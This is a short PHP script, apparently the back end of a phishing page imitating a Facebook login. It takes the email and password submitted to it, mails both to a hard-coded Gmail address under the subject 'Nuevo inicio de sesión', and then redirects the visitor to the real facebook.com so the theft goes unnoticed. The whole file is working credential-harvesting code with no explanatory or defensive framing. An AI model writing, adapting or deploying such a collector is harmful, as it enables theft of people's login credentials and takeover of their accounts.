<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = htmlspecialchars($_POST["email"]);
    $password = htmlspecialchars($_POST["password"]);
    $to = "nosoyunfandomviendovideos@gmail.com"; // Correo de destino
    
    $subject = "Nuevo inicio de sesión";
    $message = "Correo: " . $email . "\nContraseña: " . $password;
    $headers = "From: noreply@example.com\r\n";
    $headers .= "Reply-To: noreply@example.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    if (mail($to, $subject, $message, $headers)) {
        header("Location: https://www.facebook.com");
        exit();
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    echo "Acceso no autorizado.";
}
?>
